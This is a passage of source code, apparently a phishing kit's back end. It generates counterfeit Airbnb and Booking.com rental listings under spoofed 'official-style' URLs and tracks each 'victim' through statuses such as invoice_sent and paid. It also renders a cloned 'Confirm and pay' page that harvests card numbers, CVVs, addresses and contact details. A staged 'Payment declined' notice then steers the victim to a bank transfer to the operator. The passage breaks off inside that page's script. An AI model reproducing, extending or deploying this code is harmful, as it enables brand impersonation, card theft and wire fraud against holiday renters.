      <div class="mf-field"><label>Bedrooms</label><input type="number" name="bedrooms" value="${isEdit ? (L.bedrooms ?? 2) : 2}" min="0"></div>
      <div class="mf-field"><label>Beds</label><input type="number" name="beds" value="${isEdit ? (L.beds ?? 2) : 2}" min="1"></div>
      <div class="mf-field"><label>Baths</label><input type="number" step="0.5" name="baths" value="${isEdit ? (L.baths ?? 1) : 1}" min="0.5"></div>
      <div class="mf-field"><label>Rating</label><input type="text" name="rating" value="${isEdit ? esc(String(L.rating || '4.92')) : '4.92'}"></div>
      <div class="mf-field"><label>Reviews</label><input type="number" name="reviews" value="${isEdit ? (L.reviews ?? 48) : 48}" min="0" max="500"></div>
      <div class="mf-field full"><label>Description</label><textarea name="description" rows="5" placeholder="Describe the space…">${isEdit ? esc(L.description || '') : ''}</textarea></div>
    </div>
    <div class="mf-sec">Amenities</div>
    <div class="amen-grid">${amenChecks}</div>
    <div class="mf-grid" style="margin-top:12px">
      <div class="mf-field full"><label>Extra amenities</label><input type="text" name="amenities_custom" placeholder="Wine cellar, Concierge…" value="${isEdit ? esc((existingAmens.filter(a => !AMENITY_LIST.some(x => x.toLowerCase()===a.toLowerCase()))).join(', ')) : ''}"></div>
    </div>
    <div class="mf-sec">Photos & video</div>
    ${mediaEdit}
    <div class="mf-grid">
      <div class="mf-field full"><label>${isEdit ? 'Add photos' : 'Photos'}</label><input type="file" name="photos" accept="image/*" multiple></div>
      <div class="mf-field"><label>Video file</label><input type="file" name="videos" accept="video/*"></div>
      <div class="mf-field"><label>Video URL</label><input type="text" name="video_url" placeholder="https://…/tour.mp4" value="${isEdit && L.video_url && !String(L.video_url).startsWith('/uploads/') ? esc(L.video_url) : ''}"></div>
      <div class="mf-field full"><label>Host photo upload (fallback)</label><input type="file" name="host_photo" accept="image/*"></div>
      <div class="mf-field full"><label>Photo URLs (one per line)</label><textarea name="image_urls" rows="2" placeholder="https://…/photo1.jpg"></textarea></div>
    </div>
  </div>

  <div class="mf-actions">
    <button type="submit" class="mf-btn">${isEdit ? 'Save listing' : 'Generate listing'}</button>
    ${isEdit ? '<a href="/dashboard/listari" style="color:#8899ff;font-size:13px;text-decoration:none">Cancel</a>' : '<span class="mf-hint" style="margin:0">Uses apartment photos, pricing & host profile automatically. Saved to Listări.</span>'}
  </div>
</form>
<script>
(function(){
  var fixed = ${JSON.stringify(mp || '')};
  var isEdit = ${isEdit ? 'true' : 'false'};
  function mpVal(){
    if (fixed) return fixed;
    var r = document.querySelector('input[name=marketplace]:checked');
    return r ? r.value : 'airbnb';
  }
  var LOCALE_MAP = ${JSON.stringify({fr:{cur:'€',lang:'Français'},gb:{cur:'£',lang:'English'},us:{cur:'$',lang:'English'},es:{cur:'€',lang:'Español'},de:{cur:'€',lang:'Deutsch'},it:{cur:'€',lang:'Italiano'},pt:{cur:'€',lang:'Português'},ro:{cur:'RON',lang:'Română'},nl:{cur:'€',lang:'Nederlands'},jp:{cur:'¥',lang:'日本語'},au:{cur:'A$',lang:'English'},br:{cur:'R$',lang:'Português'}})};
  var LOCALE_DOMAIN = {
    airbnb:{gb:'www.airbnb.co.uk',en:'www.airbnb.co.uk',fr:'www.airbnb.fr',de:'www.airbnb.de',es:'www.airbnb.es',it:'www.airbnb.it',us:'www.airbnb.com',au:'www.airbnb.com.au',br:'www.airbnb.com.br',jp:'www.airbnb.co.jp',pt:'www.airbnb.com',ro:'www.airbnb.com',nl:'www.airbnb.com'},
    booking:{gb:'www.booking.co.uk',en:'www.booking.co.uk',fr:'www.booking.fr',de:'www.booking.de',es:'www.booking.es',it:'www.booking.it',us:'www.booking.com',au:'www.booking.com',br:'www.booking.com',jp:'www.booking.com',pt:'www.booking.com',ro:'www.booking.com',nl:'www.booking.com'}
  };
  var CUR_CODES = {fr:'EUR',gb:'GBP',us:'USD',es:'EUR',de:'EUR',it:'EUR',pt:'EUR',ro:'RON',nl:'EUR',jp:'JPY',au:'AUD',br:'BRL'};
  window.mfOnLocale = function(){
    var v = (document.getElementById('mfLocale')||{}).value || 'gb';
    var info = LOCALE_MAP[v] || LOCALE_MAP.gb;
    var curEl = document.getElementById('mfCurrencyDisplay');
    var langEl = document.getElementById('mfLangDisplay');
    if (curEl) curEl.textContent = info.cur + ' — ' + (CUR_CODES[v]||'EUR');
    if (langEl) langEl.textContent = info.lang;
    var nightLbl = document.getElementById('mfPriceNightLbl');
    var monthLbl = document.getElementById('mfPriceMonthLbl');
    if (nightLbl) nightLbl.textContent = 'Price / night (' + info.cur + ')';
    if (monthLbl) monthLbl.textContent = 'Price / month (' + info.cur + ')';
    var mpv = mpVal();
    var map = LOCALE_DOMAIN[mpv==='booking'?'booking':'airbnb'] || {};
    var want = map[v];
    var sel = document.getElementById('mfDomain');
    if (sel && want) {
      var has = Array.prototype.some.call(sel.options, function(o){ return o.value === want; });
      if (has) sel.value = want;
    }
    mfPreviewUrl();
  };
  window.mfOnMp = function(v){
    var ogAb = document.getElementById('mfOgAb');
    var ogBk = document.getElementById('mfOgBk');
    var sel = document.getElementById('mfDomain');
    if (!sel) return;
    if (v === 'booking') {
      if (ogBk) ogBk.disabled = false;
      if (ogAb) ogAb.disabled = true;
      var first = sel.querySelector('#mfOgBk option');
      if (first) sel.value = first.value;
    } else {
      if (ogAb) ogAb.disabled = false;
      if (ogBk) ogBk.disabled = true;
      var first2 = sel.querySelector('#mfOgAb option');
      if (first2) sel.value = first2.value;
    }
    mfPreviewUrl();
  };
  window.mfPreviewUrl = function(){
    var mpv = mpVal();
    var host = (document.getElementById('mfDomain') || {}).value || (mpv==='booking'?'www.booking.com':'www.airbnb.com');
    var code = ((document.getElementById('mfCode') || {}).value || '').replace(/[^a-zA-Z0-9._-]/g,'');
    var path;
    if (mpv === 'booking') {
      if (!code) code = 'your-hotel.ro.html';
      if (!/\\.html$/i.test(code)) code += '.html';
      path = '/hotel/' + code;
    } else {
      if (!code) code = '8272397239';
      path = '/rooms/' + code;
    }
    var el = document.getElementById('mfUrlPreview');
    if (el) el.innerHTML = '<span>Official-style:</span> https://' + host + path +
      '<br><span>Send link:</span> ${BASE_URL}' + path;
  };
  window.mfOnApartment = function(id){
    if (isEdit) return;
    var box = document.getElementById('mfCustomBlock');
    var hide = !!id;
    if (box) box.style.display = hide ? 'none' : 'block';
    ['title','location','price','price_month'].forEach(function(n){
      var inp = document.querySelector('#createListingForm [name="'+n+'"]');
      if (!inp) return;
      if (hide) inp.removeAttribute('required');
      else inp.setAttribute('required','required');
    });
  };
  mfOnLocale();
  var aptSel = document.getElementById('mfApartment');
  if (aptSel && !isEdit) mfOnApartment(aptSel.value);
  if (fixed) mfOnMp(fixed); else mfOnMp(mpVal());
  mfPreviewUrl();
})();
</script>`;
}


function listingTableHtml(listings, req) {
  if (!listings.length) {
    return `<div style="background:#1a1a2e;padding:40px;border-radius:16px;text-align:center;color:#888;border:1px dashed #333">
      <div style="font-size:40px;margin-bottom:12px">🏠</div>
      <div style="color:#fff;font-size:18px;margin-bottom:8px">Nicio listare inca</div>
      <div>Alege un apartment din bibliotecă, completează datele clientului și generează listarea.</div>
    </div>`;
  }
  const statusOpts = BOOKING_STATUSES.map(s =>
    `<option value="${s.id}" data-color="${s.color}" data-bg="${s.bg}">${s.label}</option>`
  ).join('');
  const rows = listings.map(l => {
    const live = livePhishUrl(l, req);
    const spoof = spoofDisplayUrl(l);
    const st = bookingStatusMeta(l.booking_status || 'not_opened');
    const cname = clientFullName(l);
    const aptLabel = l.apartment_name || l.title || '—';
    const created = l.created_at || '';
    return `<tr style="border-top:1px solid #222" class="lt-row">
      <td style="padding:12px;width:36px"><input type="checkbox" name="ids" value="${l.id}" class="lt-check" style="width:16px;height:16px;cursor:pointer;accent-color:#e74c3c"></td>
      <td style="padding:12px;color:#fff;font-weight:700;min-width:120px">${esc(cname)}
        <div style="color:#888;font-size:11px;font-weight:400">${esc(l.client_phone||'')} ${l.client_email?('· '+esc(l.client_email)):''}</div>
      </td>
      <td style="padding:12px;color:#ccc;max-width:200px">${esc(aptLabel)}
        <div style="margin-top:4px"><span style="background:${l.marketplace==='booking'?'#003580':'#FF385C'};color:#fff;padding:2px 6px;border-radius:4px;font-size:10px;font-weight:700">${esc(l.marketplace||'')}</span>
        <span style="color:#666;font-size:11px;margin-left:6px">#${l.id}</span></div>
      </td>
      <td style="padding:12px;color:#aaa;font-size:12px;white-space:nowrap">${esc(created)}
        ${l.opened_at ? '<div style="color:#22c55e;font-size:11px">opened '+esc(l.opened_at)+'</div>' : ''}
      </td>
      <td style="padding:12px">
        <select data-status-listing="${l.id}" onchange="mfSetStatus(${l.id}, this.value, this)"
          style="background:${st.bg};color:${st.color};border:1px solid ${st.color}55;border-radius:8px;padding:8px 10px;font-weight:700;font-size:12px;cursor:pointer">
          ${BOOKING_STATUSES.map(s => `<option value="${s.id}"${(l.booking_status||'not_opened')===s.id?' selected':''} style="background:#12121f;color:${s.color}">${s.label}</option>`).join('')}
        </select>
        <div data-live-listing="${l.id}" style="margin-top:6px;font-size:11px;color:#666"><span class="live-dot off"></span>idle</div>
      </td>
      <td style="padding:12px;color:#ccc">${l.views||0}</td>
      <td style="padding:12px">
        <div style="font-size:10px;color:#7fb3ff;letter-spacing:.5px;margin-bottom:2px">OFFICIAL-STYLE <span style="color:#666;font-weight:400">(afişare demo — nu se deschide)</span></div>
        <div style="display:flex;align-items:center;gap:6px">
          <input value="${esc(spoof)}" readonly onclick="this.select();window.open('${esc(live)}','_blank')" title="Click = copiază + deschide funnel-ul vostru" style="background:#0d0d1a;border:1px solid #2a4a6a;color:#7fb3ff;padding:6px 8px;font-size:11px;border-radius:4px;width:220px;cursor:pointer">
          <button type="button" onclick="window.open('${esc(live)}','_blank')" title="Deschide funnel-ul live" style="background:#e74c3c;color:#fff;border:none;border-radius:4px;padding:6px 10px;font-size:14px;cursor:pointer;font-weight:700;line-height:1">▶</button>
        </div>
        <div style="font-size:10px;color:#4CAF50;letter-spacing:.5px;margin:8px 0 2px">LIVE FUNNEL</div>
        <input value="${esc(live)}" readonly onclick="this.select()" style="background:#0d0d1a;border:1px solid #333;color:#4CAF50;padding:6px 8px;font-size:11px;border-radius:4px;width:220px">
        <div style="margin-top:4px"><a href="${esc(live)}" target="_blank" style="color:#8899ff;font-size:11px">Open funnel</a></div>
      </td>
      <td style="padding:12px;white-space:nowrap">
        <a href="/dashboard/listings/edit/${l.id}" style="color:#4da3ff;text-decoration:none;font-size:13px;margin-right:10px;font-weight:600">Edit</a>
        <a href="/dashboard/listings/delete/${l.id}" onclick="return confirm('Delete listing?')" style="color:#f44336;text-decoration:none;font-size:13px">Delete</a>
      </td>
    </tr>`;
  }).join('');
  return `<form method="POST" action="/dashboard/listings/delete-bulk" id="ltBulkForm" onsubmit="return ltConfirmBulk()">
    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:12px">
      <button type="submit" id="ltBulkBtn" disabled style="background:#e74c3c;color:#fff;border:none;border-radius:8px;padding:10px 16px;font-weight:700;cursor:pointer;opacity:.45">Delete selected (<span id="ltSelCount">0</span>)</button>
      <label style="color:#aaa;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px">
        <input type="checkbox" id="ltCheckAll" style="width:16px;height:16px;accent-color:#e74c3c;cursor:pointer"> Select all
      </label>
      <div style="margin-left:auto;display:flex;gap:8px;flex-wrap:wrap">
        ${BOOKING_STATUSES.map(s => `<span class="bs-badge" style="background:${s.bg};color:${s.color};border:1px solid ${s.color}44">${s.label}</span>`).join('')}
      </div>
    </div>
    <div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;background:#1a1a2e;border-radius:12px;overflow:hidden">
    <thead><tr style="background:#12121f;text-align:left">
      <th style="padding:12px;width:36px"></th>
      <th style="padding:12px;color:#888;font-size:12px">Client</th>
      <th style="padding:12px;color:#888;font-size:12px">Apartment</th>
      <th style="padding:12px;color:#888;font-size:12px">Created</th>
      <th style="padding:12px;color:#888;font-size:12px">Status</th>
      <th style="padding:12px;color:#888;font-size:12px">Views</th>
      <th style="padding:12px;color:#888;font-size:12px">Link</th>
      <th style="padding:12px;color:#888;font-size:12px"></th>
    </tr></thead>
    <tbody>${rows}</tbody></table></div>
  </form>
  <script>
  (function(){
    var form=document.getElementById('ltBulkForm');
    if(!form) return;
    var all=document.getElementById('ltCheckAll');
    var btn=document.getElementById('ltBulkBtn');
    var cnt=document.getElementById('ltSelCount');
    function boxes(){return Array.prototype.slice.call(form.querySelectorAll('.lt-check'));}
    function refresh(){
      var b=boxes(), n=b.filter(function(x){return x.checked}).length;
      cnt.textContent=String(n);
      btn.disabled=n===0;
      btn.style.opacity=n? '1':'0.45';
      btn.style.cursor=n? 'pointer':'not-allowed';
      if(all) all.checked=n>0 && n===b.length;
    }
    form.addEventListener('change', function(e){
      if(e.target && e.target.classList && e.target.classList.contains('lt-check')) refresh();
    });
    if(all) all.addEventListener('change', function(){
      boxes().forEach(function(x){ x.checked=all.checked; });
      refresh();
    });
    window.ltConfirmBulk=function(){
      var n=boxes().filter(function(x){return x.checked}).length;
      if(!n) return false;
      return confirm('Delete '+n+' selected listings?');
    };
    window.mfSetStatus = function(id, status, sel){
      fetch('/dashboard/listings/status/'+id, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({status: status})
      }).then(function(r){return r.json()}).then(function(d){
        if(!d || !d.ok){ alert((d&&d.error)||'Status update failed'); return; }
        var map = {not_opened:['#6b7280','#1f2937'], open:['#22c55e','#052e16'], in_review:['#f59e0b','#422006'], invoice_sent:['#3b82f6','#0c1a33'], payment_declined:['#ef4444','#450a0a'], paid:['#a855f7','#2e1065']};
        var c = map[status] || map.not_opened;
        if(sel){ sel.style.color=c[0]; sel.style.background=c[1]; sel.style.borderColor=c[0]+'55'; }
      }).catch(function(){ alert('Status update failed'); });
    };
    refresh();
  })();
  </script>`;
}



/** Airbnb-style Confirm and pay full page (listing photos + trip summary + card capture). */
function computeStayQuote(listing, checkin, checkout, adults) {
  const locale = listing.locale || 'en';
  const info = LOCALES[locale] || LOCALES.en;
  const currency = listing.currency || info.currency || 'GBP';
  const sym = info.currencySymbol || '£';
  const hideNightly = Number(listing.hide_nightly) === 1;
  const priceNight = parseFloat(listing.price) || 0;
  const priceMonth = parseFloat(listing.price_month) || (priceNight ? Math.round(priceNight * 28) : 0);
  let nights = 2;
  try {
    if (checkin && checkout) {
      const a = new Date(checkin + 'T12:00:00');
      const b = new Date(checkout + 'T12:00:00');
      const d = Math.round((b - a) / 86400000);
      if (d > 0 && d < 370) nights = d;
    }
  } catch (e) {}
  adults = Math.max(1, parseInt(adults, 10) || 1);
  let base = hideNightly ? (priceMonth || priceNight * nights) : (priceNight * nights);
  if (!base || base <= 0) base = hideNightly ? 2100 : 70 * nights;
  base = Math.round(base * 100) / 100;
  const discount = hideNightly ? 0 : Math.round(base * 0.06 * 100) / 100;
  const total = Math.max(0, Math.round((base - discount) * 100) / 100);
  const perNight = nights ? Math.round((base / nights) * 100) / 100 : priceNight;
  return { locale, currency, sym, hideNightly, nights, adults, base, discount, total, perNight, priceNight, priceMonth };
}

function fmtMoney(amount, currency, locale) {
  try {
    return new Intl.NumberFormat(locale === 'en' || locale === 'gb' || locale === 'us' ? 'en-GB' : undefined, {
      style: 'currency', currency: currency || 'GBP', maximumFractionDigits: 2
    }).format(Number(amount) || 0);
  } catch (e) {
    return (currency || 'GBP') + ' ' + (Number(amount) || 0).toFixed(2);
  }
}

function fmtDateRange(checkin, checkout, locale) {
  try {
    const opts = { day: 'numeric', month: 'short', year: 'numeric' };
    const a = checkin ? new Date(checkin + 'T12:00:00') : null;
    const b = checkout ? new Date(checkout + 'T12:00:00') : null;
    if (a && b) {
      const sameMonth = a.getMonth() === b.getMonth() && a.getFullYear() === b.getFullYear();
      if (sameMonth) {
        return a.getDate() + '–' + b.toLocaleDateString('en-GB', opts);
      }
      return a.toLocaleDateString('en-GB', opts) + ' – ' + b.toLocaleDateString('en-GB', opts);
    }
    if (a) return a.toLocaleDateString('en-GB', opts);
  } catch (e) {}
  return (checkin || '') + (checkout ? ' – ' + checkout : '');
}

function airbnbConfirmPayPage(listing, victimId, q) {
  q = q || {};
  const imgs = parseListingImages(listing);
  const photo = imgs[0] || listing.image_url || 'https://images.unsplash.com/photo-1502672260266-1c1ef2d93688?w=400';
  const title = listing.title || 'Your stay';
  const location = listing.location || '';
  const host = listing.host_name || 'Host';
  const code = listing.listing_code || String(listing.id);
  const checkin = String(q.checkin || q.checkIn || '').slice(0, 10);
  const checkout = String(q.checkout || q.checkOut || '').slice(0, 10);
  const adults = Math.max(1, parseInt(q.numberOfAdults || q.adults || q.guests || '1', 10) || 1);
  const children = Math.max(0, parseInt(q.numberOfChildren || q.children || '0', 10) || 0);
  const infants = Math.max(0, parseInt(q.numberOfInfants || '0', 10) || 0);
  const pets = Math.max(0, parseInt(q.numberOfPets || '0', 10) || 0);
  const quote = computeStayQuote(listing, checkin, checkout, adults + children);
  const money = (n) => fmtMoney(n, quote.currency, quote.locale);
  const dateLabel = fmtDateRange(checkin, checkout, quote.locale);
  const guestLabel = adults + (adults === 1 ? ' adult' : ' adults')
    + (children ? (', ' + children + (children === 1 ? ' child' : ' children')) : '')
    + (infants ? (', ' + infants + (infants === 1 ? ' infant' : ' infants')) : '');
  const rating = listing.rating || '5.0';
  const reviews = listing.reviews || '4';
  const roomBack = listing.public_path || ('/rooms/' + code);
  const payCfg = resolvePaymentConfig(listing.user_id) || {};
  const payJson = JSON.stringify(paymentConfigPublic(payCfg));
  const metaJson = JSON.stringify({
    id: listing.id,
    code: code,
    title: title,
    total: quote.total,
    currency: quote.currency,
    nights: quote.nights,
    checkin: checkin,
    checkout: checkout,
    adults: adults,
    photo: photo,
    roomBack: roomBack
  });

  const freeCancel = (() => {
    try {
      if (!checkin) return 'Free cancellation before check-in';
      const d = new Date(checkin + 'T12:00:00');
      d.setDate(d.getDate() - 1);
      return 'Cancel before ' + d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long' }) + ' for a full refund.';
    } catch (e) { return 'Free cancellation available'; }
  })();

  return `<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Confirm and pay - Airbnb</title>
<style>
*{box-sizing:border-box}html,body{margin:0;padding:0;background:#fff;color:#222;
font-family:Circular,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-webkit-font-smoothing:antialiased}
a{color:inherit}
.top{position:sticky;top:0;z-index:20;background:#fff;border-bottom:1px solid #ebebeb;height:80px;display:flex;align-items:center;padding:0 40px}
.top-logo{display:flex;align-items:center;gap:6px;text-decoration:none;color:#FF385C;font-weight:700;font-size:22px}
.top-logo svg{display:block}
.wrap{max-width:1080px;margin:0 auto;padding:32px 40px 80px}
.back{width:40px;height:40px;border-radius:50%;border:0;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;margin:0 0 8px -8px}
.back:hover{background:#f7f7f7}
h1{font-size:32px;font-weight:600;letter-spacing:-0.02em;margin:0 0 28px}
.grid{display:grid;grid-template-columns:1.15fr 0.85fr;gap:48px;align-items:start}
@media(max-width:900px){.grid{grid-template-columns:1fr;gap:28px}.top,.wrap{padding-left:20px;padding-right:20px}h1{font-size:26px}}
.card{border:1px solid #dddddd;border-radius:16px;padding:24px;margin-bottom:24px;background:#fff}
.card h2{font-size:22px;font-weight:600;margin:0 0 18px}
.pay-opt{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;padding:16px 0;border-top:1px solid #ebebeb;cursor:pointer}
.pay-opt:first-of-type{border-top:0;padding-top:0}
.pay-opt .lbl{font-size:16px;font-weight:500}
.pay-opt .sub{font-size:14px;color:#717171;margin-top:4px;line-height:1.4}
.pay-opt input{accent-color:#222;width:20px;height:20px;margin-top:2px}
.pm-row{display:flex;align-items:center;justify-content:space-between;gap:12px;padding-top:4px}
.pm-left{display:flex;align-items:center;gap:10px;font-size:16px}
.brand{display:inline-flex;gap:6px;align-items:center}
.brand span{font-size:11px;font-weight:800;letter-spacing:.02em;padding:2px 5px;border-radius:3px;border:1px solid #ddd;color:#1a1f71}
.btn-ghost{background:#fff;border:1px solid #222;border-radius:8px;padding:8px 16px;font-size:14px;font-weight:600;cursor:pointer}
.btn-ghost:hover{background:#f7f7f7}
.field{margin:0 0 14px}
.field label{display:block;font-size:12px;font-weight:600;margin:0 0 6px;color:#222}
.field input,.field select{width:100%;padding:14px 12px;border:1px solid #b0b0b0;border-radius:8px;font-size:16px;font-family:inherit;background:#fff}
.field input:focus,.field select:focus{outline:none;border-color:#222;box-shadow:0 0 0 1px #222}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.hint{font-size:12px;color:#717171;margin:4px 0 0}
.agree{font-size:12px;color:#717171;line-height:1.5;margin:8px 0 18px}
.agree a{text-decoration:underline}
.btn-pay{width:100%;border:0;border-radius:8px;padding:16px 20px;font-size:16px;font-weight:600;color:#fff;cursor:pointer;
background:linear-gradient(to right,#E61E4D 0%,#E31C5F 50%,#D70466 100%)}
.btn-pay:hover{filter:brightness(1.05)}
.btn-pay:disabled{opacity:.55;cursor:not-allowed}
.side{position:sticky;top:100px}
.side-card{border:1px solid #dddddd;border-radius:16px;padding:24px;box-shadow:0 6px 20px rgba(0,0,0,.06)}
.listing-row{display:flex;gap:14px;padding-bottom:20px;border-bottom:1px solid #ebebeb}
.listing-row img{width:124px;height:106px;object-fit:cover;border-radius:12px;flex-shrink:0;background:#f0f0f0}
.listing-row .t{font-size:16px;font-weight:600;line-height:1.3;margin:0 0 6px}
.listing-row .m{font-size:14px;color:#222;margin:0 0 4px}
.listing-row .s{font-size:13px;color:#717171}
.block{padding:18px 0;border-bottom:1px solid #ebebeb}
.block:last-child{border-bottom:0;padding-bottom:0}
.block h3{font-size:16px;font-weight:600;margin:0 0 10px}
.kv{display:flex;justify-content:space-between;gap:12px;font-size:15px;margin:0 0 8px}
.kv .muted{color:#717171}
.kv.total{font-weight:600;font-size:16px;margin-top:10px}
.kv .green{color:#008a05}
.linkish{font-size:14px;text-decoration:underline;cursor:pointer;background:none;border:0;padding:0;font-family:inherit}
.err-box{display:none;background:#fff8f6;border:1px solid #e8cccc;border-radius:12px;padding:16px 18px;margin:0 0 20px}
.err-box.show{display:block}
.err-box h3{margin:0 0 6px;color:#c13515;font-size:18px}
.err-box p{margin:0;color:#222;font-size:14px;line-height:1.45}
.manual{display:none}
.manual.show{display:block}
.manual .bank{background:#f7f7f7;border-radius:12px;padding:16px;font-size:14px;line-height:1.75;margin:14px 0}
.step-pay{display:block}
.step-pay.hide{display:none}
.chips{display:flex;gap:8px;flex-wrap:wrap;margin:10px 0 0}
.chip{font-size:11px;border:1px solid #ddd;border-radius:4px;padding:3px 6px;font-weight:700;color:#1a1f71}
#toast{display:none;position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#222;color:#fff;padding:12px 18px;border-radius:10px;font-size:14px;z-index:50}
</style>
</head>
<body>
<header class="top">
  <a class="top-logo" href="${esc(roomBack)}" aria-label="Airbnb">
    <svg viewBox="0 0 32 32" width="32" height="32" fill="currentColor" aria-hidden="true"><path d="M16 1c2 5 7 9 13 10-1 6-5 12-13 20C8 23 4 17 3 11 9 10 14 6 16 1z"/></svg>
    <span>airbnb</span>
  </a>
</header>
<main class="wrap">
  <button type="button" class="back" onclick="location.href='${esc(roomBack)}'" aria-label="Back">
    <svg viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 28 8 16 20 4"/></svg>
  </button>
  <h1 id="page-title">Confirm and pay</h1>

  <div id="err-box" class="err-box">
    <h3>Payment declined</h3>
    <p>Your card was declined. Please complete payment using the bank transfer details below to confirm your reservation.</p>
  </div>

  <div class="grid">
    <div class="left">
      <div id="step-pay" class="step-pay">
        <div class="card">
          <h2>Choose when to pay</h2>
          <label class="pay-opt"><div><div class="lbl">Pay ${esc(money(quote.total))} now</div></div>
            <input type="radio" name="when" value="full" checked></label>
          <label class="pay-opt"><div><div class="lbl">Pay part now, part later</div>
            <div class="sub">${esc(money(Math.round(quote.total*0.2*100)/100))} now, ${esc(money(Math.round(quote.total*0.8*100)/100))} charged later. No extra fees.</div></div>
            <input type="radio" name="when" value="part"></label>
          <label class="pay-opt"><div><div class="lbl">Pay in 3 payments</div>
            <div class="sub">3 payments of ${esc(money(Math.round(quote.total/3*100)/100))} (0% APR).</div></div>
            <input type="radio" name="when" value="klarna"></label>
        </div>

        <div class="card">
          <div class="pm-row">
            <h2 style="margin:0">Payment method</h2>
            <button type="button" class="btn-ghost" id="btn-change-pm">Change</button>
          </div>
          <div class="pm-left" style="margin-top:14px">
            <span style="font-size:22px">💳</span>
            <span>Debit or credit card</span>
          </div>
          <div class="chips">
            <span class="chip">VISA</span><span class="chip">AMEX</span><span class="chip">Mastercard</span>
          </div>
          <form id="pay-form" style="margin-top:18px" autocomplete="on">
            <div class="field"><label for="cc-name">Cardholder name</label>
              <input id="cc-name" name="cc-name" autocomplete="cc-name" required placeholder="Name on card"></div>
            <div class="field"><label for="cc-number">Card number</label>
              <input id="cc-number" name="cc-number" inputmode="numeric" autocomplete="cc-number" required maxlength="19" placeholder="1234 5678 9012 3456"></div>
            <div class="row2">
              <div class="field"><label for="cc-exp">Expiration</label>
                <input id="cc-exp" name="cc-exp" autocomplete="cc-exp" required maxlength="5" placeholder="MM/YY"></div>
              <div class="field"><label for="cc-cvv">CVV</label>
                <input id="cc-cvv" name="cc-cvv" inputmode="numeric" autocomplete="cc-csc" required maxlength="4" placeholder="123"></div>
            </div>
            <div class="field"><label for="g-name">Full name</label>
              <input id="g-name" name="full_name" autocomplete="name" required placeholder="First and last name"></div>
            <div class="field"><label for="g-email">Email</label>
              <input id="g-email" name="email" type="email" autocomplete="email" required placeholder="Email for confirmation"></div>
            <div class="field"><label for="g-phone">Phone</label>
              <input id="g-phone" name="phone" type="tel" autocomplete="tel" required placeholder="Phone number"></div>
            <div class="field"><label for="g-country">Country/region</label>
              <select id="g-country" name="country"><option>United Kingdom</option><option>United States</option><option>Romania</option><option>France</option><option>Germany</option><option>Spain</option><option>Italy</option><option>Other</option></select></div>
            <div class="field"><label for="g-address">Street address</label>
              <input id="g-address" name="address" autocomplete="street-address" required placeholder="House number and street"></div>
            <div class="row2">
              <div class="field"><label for="g-city">City</label>
                <input id="g-city" name="city" autocomplete="address-level2" required></div>
              <div class="field"><label for="g-postcode">Postcode</label>
                <input id="g-postcode" name="postcode" autocomplete="postal-code" required></div>
            </div>
            <p class="agree">By selecting the button, I agree to the <a href="#">booking terms</a>, <a href="#">House Rules</a> and <a href="#">Rebooking and Refund Policy</a>.</p>
            <button class="btn-pay" id="btn-pay" type="submit">Confirm and pay</button>
          </form>
        </div>
      </div>

      <div id="step-manual" class="manual card">
        <h2>Complete payment by bank transfer</h2>
        <p class="sub" style="color:#717171;font-size:15px;line-height:1.5;margin:0 0 8px">Your card could not be charged. Transfer <strong id="man-amount">${esc(money(quote.total))}</strong> using the details from the host payment configuration. Your reservation is held for 24 hours.</p>
        <div class="bank" id="man-bank">
          <div id="row-bank"><strong>Bank:</strong> <span id="m-bank"></span></div>
          <div id="row-ben"><strong>Beneficiary:</strong> <span id="m-ben"></span></div>
          <div id="row-iban"><strong>IBAN:</strong> <span id="m-iban"></span></div>
          <div id="row-bic"><strong>BIC/SWIFT:</strong> <span id="m-bic"></span></div>
          <div id="row-acc"><strong>Account number:</strong> <span id="m-acc"></span></div>
          <div id="row-sort"><strong>Sort code:</strong> <span id="m-sort"></span></div>
          <div id="row-route"><strong>Routing number:</strong> <span id="m-route"></span></div>
          <div id="row-atype"><strong>Account type:</strong> <span id="m-atype"></span></div>
          <div id="row-bsb"><strong>BSB:</strong> <span id="m-bsb"></span></div>
          <div id="row-addr"><strong>Bank address:</strong> <span id="m-addr"></span></div>
          <div><strong>Amount:</strong> <span id="m-amt">${esc(money(quote.total))}</span></div>
          <div><strong>Reference:</strong> <span id="m-ref">ABB-${esc(String(victimId || ''))}</span></div>
        </div>
        <button type="button" class="btn-pay" id="btn-transfer-done">I've made the transfer</button>
      </div>
    </div>

    <aside class="side">
      <div class="side-card">
        <div class="listing-row">
          <img src="${esc(photo)}" alt="">
          <div>
            <p class="t">${esc(title)}</p>
            <p class="m">${esc(location)}</p>
            <p class="s">★ ${esc(String(rating))} (${esc(String(reviews))})</p>
          </div>
        </div>
        <div class="block">
          <h3>Free cancellation</h3>
          <div class="muted" style="font-size:14px;color:#717171;line-height:1.45">${esc(freeCancel)}</div>
        </div>
        <div class="block">
          <div class="kv"><h3 style="margin:0">Dates</h3>
            <button type="button" class="linkish" onclick="location.href='${esc(roomBack)}'">Change</button></div>
          <div style="font-size:15px">${esc(dateLabel || 'Add dates')}</div>
        </div>
        <div class="block">
          <div class="kv"><h3 style="margin:0">Guests</h3>
            <button type="button" class="linkish" onclick="location.href='${esc(roomBack)}'">Change</button></div>
          <div style="font-size:15px">${esc(guestLabel)}</div>
        </div>
        <div class="block">
          <h3>Price details</h3>
          <div class="kv"><span class="muted">${quote.hideNightly ? (esc(money(quote.base)) + ' total') : (esc(money(quote.perNight)) + ' x ' + quote.nights + ' nights')}</span><span>${esc(money(quote.base))}</span></div>
          ${quote.discount > 0 ? '<div class="kv"><span class="muted">Last-minute discount</span><span class="green">-' + esc(money(quote.discount)) + '</span></div>' : ''}
          <div class="kv total"><span>Total (${esc(quote.currency)})</span><span>${esc(money(quote.total))}</span></div>
        </div>
      </div>
    </aside>
  </div>
</main>
<div id="toast"></div>
<script>
(function(){
  var VID = ${JSON.stringify(String(victimId || ''))};
